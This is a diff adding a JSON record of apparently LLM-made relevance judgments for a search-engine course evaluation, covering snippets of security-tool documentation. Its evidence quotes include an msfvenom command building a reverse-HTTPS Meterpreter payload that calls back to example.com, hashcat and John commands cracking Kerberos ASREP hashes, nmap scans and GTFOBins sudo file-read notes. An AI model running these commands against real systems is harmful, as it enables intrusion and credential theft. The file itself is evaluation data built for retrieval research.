@@ -1,0 +1,237 @@
+{
+  "review_origin": "llm",
+  "evaluator": "Codex CLI default model; exact identifier not exposed by JSON events",
+  "input_sha256": "84849867f20672c067a8e31729abda268fe00cc9add60217278e454b4ca87e65",
+  "policy_sha256": "4a41becbce596ebfef0fdbcce2b81c4daba130fb45140ba4a45a816a52a4a7f4",
+  "prompt_sha256": "bf172124e5f96beae1df797f55272c24a64c35fae116ab87ec6da3dda0eda565",
+  "schema_sha256": "c3529c3a315af2a5be1c5bf46f4242811582a43c226d92111f17fd4ca92911e5",
+  "raw_events_sha256": "406e2f1a2f9d68e5b82f1cc8095866adfd121de7f1682d94a3b63f89677f6a11",
+  "started_at": 1793848388.4559,
+  "finished_at": 1793848434.7572439,
+  "command": [
+    "codex",
+    "exec",
+    "--ephemeral",
+    "--ignore-user-config",
+    "--skip-git-repo-check",
+    "--sandbox",
+    "read-only",
+    "--cd",
+    "/tmp",
+    "--json",
+    "--color",
+    "never",
+    "--output-schema",
+    "/Users/gavin/Documents/ChatGPT/資料檢索/work/search-engine-course-upgrade/data/evaluation/v8.2-llm/schema.json",
+    "--disable",
+    "shell_tool",
+    "--disable",
+    "apps",
+    "--disable",
+    "plugins",
+    "--disable",
+    "multi_agent",
+    "--disable",
+    "browser_use",
+    "--disable",
+    "computer_use",
+    "--disable",
+    "memories",
+    "--disable",
+    "chronicle",
+    "-"
+  ],
+  "result": {
+    "decisions": [
+      {
+        "decision_id": "42bcb0e11ebaa32d7a21-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "提供 msfvenom 產生 payload 的具體指令。",
+        "evidence": "$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDRaw=4444444444444444 -f exe -o payload.exe"
+      },
+      {
+        "decision_id": "82e2995ad5576dd57523-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "示範產生反向 HTTPS Meterpreter payload，並展示 handler 接收連線。",
+        "evidence": "Meterpreter session 1 opened (127.1.1.1:4444 -> 127.0.0.1:36235)"
+      },
+      {
+        "decision_id": "1ec0cf392b67fd059657-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "介紹透過 HTTP 代理建立 TCP 隧道，未說明 Android CA 安裝或信任。",
+        "evidence": "Proxytunnel creates tunnels through HTTP(S) proxies for any TCP based protocol."
+      },
+      {
+        "decision_id": "075337b91a08a3f8cfd7-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "明確說明以 -sn 探索存活主機而不掃描連接埠。",
+        "evidence": "This option tells Nmap not to run a port scan after host discovery."
+      },
+      {
+        "decision_id": "48328f9b57462a35df59-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "內容為網路主機探索，未提供遞迴網站目錄探索。",
+        "evidence": "Nmap offers several high-level options to control this behavior. List Scan ( -sL )"
+      },
+      {
+        "decision_id": "e770a23c224182ce0320-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "說明主機存活探測，並非網站隱藏檔案或內容探索。",
+        "evidence": "It can easily be used to count available machines on a network or monitor server availability."
+      },
+      {
+        "decision_id": "97412a0f27a3cfa49999-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "僅介紹無線統計選單，未記載 WPA 握手擷取或處理。",
+        "evidence": "Each menu item shows specific Bluetooth and IEEE 802.11 statistics."
+      },
+      {
+        "decision_id": "02ffbf8b7fd8d7fbe283-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "提供已知 ASREP 格式的破解流程，未教導辨識未知雜湊格式。",
+        "evidence": "Cracking ASREP response with Hashcat: hashcat -m 18200 -a 0 ./hashes.txt ./wordlist.txt"
+      },
+      {
+        "decision_id": "9ec159b8e012bdc77b74-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "提供使用 John 與 Hashcat 離線破解 ASREP 的指令。",
+        "evidence": "Cracking ASREP response with John: john ./hashes.txt --wordlist=./wordlist.txt --format:krb5asrep"
+      },
+      {
+        "decision_id": "c1c690dd274f895b11dc-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "內容為 Kerberos 帳號列舉與密碼測試，並非網站目錄探索。",
+        "evidence": "The auxiliary/scanner/kerberos/kerberos_login module can verify Kerberos credentials against a range of machines and report successful logins."
+      },
+      {
+        "decision_id": "65950f23a68e00837e53-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "說明檢視已擷取封包，未提供 HTTP 請求重送功能。",
+        "evidence": "You can then expand any part of the tree to view detailed information about each protocol in each packet."
+      },
+      {
+        "decision_id": "b63aa5385159283b4370-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "提供 Wireshark 檢視與分析已擷取封包的操作方式。",
+        "evidence": "Clicking on an item in the tree will highlight the corresponding bytes in the byte view."
+      },
+      {
+        "decision_id": "e2bc6675c9ca77f90c13-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "篩選僅出現在目錄標題，未提供依 IP 篩選的實質指引。",
+        "evidence": "6.3. Filtering Packets While Viewing 6.4. Building Display Filter Expressions"
+      },
+      {
+        "decision_id": "9e8236a56d9b9a1f9073-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "說明封包清單與來源目的欄位，未教導依 IP 篩選。",
+        "evidence": "Source The address where this packet is coming from. Destination The address where this packet is going to."
+      },
+      {
+        "decision_id": "5315534ab6cc704677db-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "說明服務版本指紋辨識與掃描指令，以及辨識資料庫的修正方式。",
+        "evidence": "Run the command nmap -O -Pn -sSV -T4 -d --version-trace -p <port> <target>"
+      },
+      {
+        "decision_id": "59ef8ab2b315fa3e0a63-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "提供 UDP 連接埠指定方式與啟用 UDP 掃描的參數。",
+        "evidence": "Note that to scan both UDP and TCP, you have to specify -sU and at least one TCP scan type"
+      },
+      {
+        "decision_id": "a778383ffbaecaafa14d-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "僅指向 NSE 腳本入口，未說明 UDP 掃描。",
+        "evidence": "This section (a long list of NSE scripts with brief summaries) is only provided in the printed edition of this book"
+      },
+      {
+        "decision_id": "d6bab68a08a71fbf9f1a-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "GTFOBins 條目明確記載 sudo 保留權限的讀檔行為。",
+        "evidence": "Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped."
+      },
+      {
+        "decision_id": "32f4098a056439f438b1-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "實質解釋作業系統指紋方法、Nmap 排除的方法及辨識限制。",
+        "evidence": "For these reasons, Nmap does not consider open port numbers during TCP/IP stack fingerprinting."
+      },
+      {
+        "decision_id": "3f4ae8963a31afab0a14-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "示範連接正在執行的程序並載入 instrumentation 腳本。",
+        "evidence": "# Connect Frida to a locally-running Calculator.app and load calc.js $ frida Calculator -l calc.js"
+      },
+      {
+        "decision_id": "fb222f4b3607bc732fcc-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "GTFOBins cat 條目記載 sudo 執行時的特權讀檔能力。",
+        "evidence": "Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped."
+      },
+      {
+        "decision_id": "2753e768b18b9e16b99e-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "提供列出執行中程序的指令，可用於選擇 Frida 附加目標。",
+        "evidence": "# Connect Frida to an iPad over USB and list running processes $ frida-ps -U"
+      },
+      {
+        "decision_id": "cb28aeef0854c1aecf94-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "僅示範一般程序列舉與 iPad 連線，未記載 Android instrumentation 或 hooks。",
+        "evidence": "This is a command-line tool for listing processes, which is very useful when interacting with a remote system."
+      },
+      {
+        "decision_id": "111ad6960ff9b7429a1d-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "明確描述可搜尋 SQL injection 的 SIP 模糊測試工具。",
+        "evidence": "SIP Army Knife is a fuzzer that searches for cross site scripting, SQL injection, log injection, format strings, buffer overflows, and more."
+      },
+      {
+        "decision_id": "2638e0089a492b126e59-0",
+        "relevant": 1,
+        "confidence": "high",
+        "reason": "提供可安裝的使用者工具，並明載 SQL injection 偵測能力。",
+        "evidence": "SIP Army Knife is a fuzzer that searches for cross site scripting, SQL injection, log injection, format strings, buffer overflows, and more."
+      },
+      {
+        "decision_id": "7f400ceead094d77920a-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "工具用模糊雜湊比較檔案相似度，不辨識密碼雜湊格式。",
+        "evidence": "Fuzzy hashing is a method for comparing similar but not identical files."
+      },
+      {
+        "decision_id": "c201e630193a813576a4-0",
+        "relevant": 0,
+        "confidence": "high",
+        "reason": "遞迴功能用於檔案雜湊計算，並非網站目錄探索。",
+        "evidence": "ssdeep is a tool for recursive computing and matching of Context Triggered Piecewise Hashing (aka Fuzzy Hashing)."
+      }
+    ]
+  }
+}
